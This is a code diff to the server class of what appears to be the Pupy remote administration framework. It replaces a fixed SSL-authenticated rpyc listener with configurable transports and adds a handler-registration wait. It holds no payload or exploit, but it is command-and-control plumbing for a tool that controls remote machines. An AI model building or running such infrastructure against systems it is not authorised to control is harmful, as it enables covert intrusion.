@@ -15,8 +15,6 @@
 # --------------------------------------------------------------
 
 import threading
-from rpyc.utils.authenticators import SSLAuthenticator
-from rpyc.utils.server import ThreadPoolServer
 from . import PupyService
 import textwrap
 import pkgutil
@@ -25,6 +23,7 @@ import logging
 from .PupyErrors import PupyModuleExit, PupyModuleError
 from .PupyJob import PupyJob
 from .PupyCmd import color_real
+from network.conf import transports
 
 try:
 	import ConfigParser as configparser
@@ -33,8 +32,9 @@ except ImportError:
 from . import PupyClient
 import os.path
 
+
 class PupyServer(threading.Thread):
-	def __init__(self, configFile="pupy.conf"):
+	def __init__(self, transport, port=None):
 		super(PupyServer, self).__init__()
 		self.daemon=True
 		self.server=None
@@ -45,14 +45,20 @@ class PupyServer(threading.Thread):
 		self.clients_lock=threading.Lock()
 		self.current_id=1
 		self.config = configparser.ConfigParser()
-		self.config.read(configFile)
-		self.port=self.config.getint("pupyd","port")
-		self.address=self.config.get("pupyd","address")
+		self.config.read("pupy.conf")
+		if port is None:
+			self.port=self.config.getint("pupyd", "port")
+		else:
+			self.port=port
+		self.address=self.config.get("pupyd", "address")
 		self.handler=None
+		self.handler_registered=threading.Event()
+		self.transport=transport
 
 	def register_handler(self, instance):
 		""" register the handler instance, typically a PupyCmd, and PupyWeb in the futur"""
 		self.handler=instance
+		self.handler_registered.set()
 
 	def add_client(self, conn):
 		with self.clients_lock:
@@ -253,8 +259,10 @@ class PupyServer(threading.Thread):
 		return self.jobs[job_id]
 		
 	def run(self):
-		self.authenticator = SSLAuthenticator(self.config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep), self.config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep), ciphers="SHA256+AES256:SHA1+AES256:@STRENGTH")
-		self.server = ThreadPoolServer(PupyService.PupyService, port = self.port, hostname=self.address, authenticator=self.authenticator)
+		self.handler_registered.wait()
+		self.handler.display_srvinfo("Server started on %s:%s with transport %s"%(self.address, self.port, self.transport))
+		t=transports[self.transport]
+		self.server = t['server'](PupyService.PupyService, port = self.port, hostname=self.address, authenticator=t['authenticator'], stream=t['stream'], transport=t['server_transport'])
 		self.server.start()
 
 
